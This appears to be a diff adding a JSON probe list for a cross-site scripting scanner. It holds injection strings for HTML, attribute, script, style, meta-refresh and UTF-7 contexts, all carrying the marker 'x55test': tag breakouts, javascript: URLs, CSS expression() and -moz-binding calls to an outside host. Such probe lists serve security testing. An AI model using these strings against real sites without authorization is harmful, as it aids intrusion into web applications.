@@ -1,0 +1,39 @@
+{
+    "betweenCommonTag": ["<x55test>", "--><x55test>"],
+
+    "betweenTitle": ["</title><x55test>"],
+    
+    "betweenTextarea": ["</textarea><x55test>"],
+    
+    "betweenXmp": ["</xmp><x55test>"],
+    
+    "betweenIframe": ["</iframe><x55test>"],
+    
+    "betweenNoscript": ["</noscript><x55test>"],
+    
+    "betweenNoframes": ["</noframes><x55test>"],
+    
+    "betweenPlaintext": ["</plaintext><x55test>"],
+    
+    "betweenScript": ["</script><x55test>", "\"x55test(1)", "'x55test(1)", "x55test(1)"],
+    
+    "betweenStyle": ["</style><x55test>", "1;x:expression(x55test)", "1;body{background:url(javascript:x55test)}",
+    "1;body{background-image:url(javascript:x55test)}", "1;li{list-style-image:url(javascript:x55test)}",
+    "1;body{-moz-binding:url(http://x55test.com/1.xml)}", "1;html{behavior:url(1.htc)}", "1;@import x55test",
+    "1;x:x55test"],
+    
+    "utf-7": ["+/v8 +ADw-x55test+AD4-"],
+
+    "inMetaRefresh": ["javascript:x55test", "data:x55test", "x55test"],
+
+    "inCommonAttr": ["\" x55test=x55", "' x55test=x55", " x55test=x55", 
+    "\"><x55test>", "'><x55test>", "><x55test>"],
+
+    "inSrcHrefAction": ["javascript:x55test", "data:x55test", "x55test"],
+    
+    "inScript": ["\"x55test", "'x55test", "x55test"],
+    
+    "inStyle": ["1;x:expression(x55test)", "1;background:url(javascript:x55test)",
+    "1;background-image:url(javascript:x55test)", "1;list-style-image:url(javascript:x55test)",
+    "1;-moz-binding:url(http://x55test.com/1.xml)", "1;behavior:url(1.htc)", "1;x:x55test"]
+}
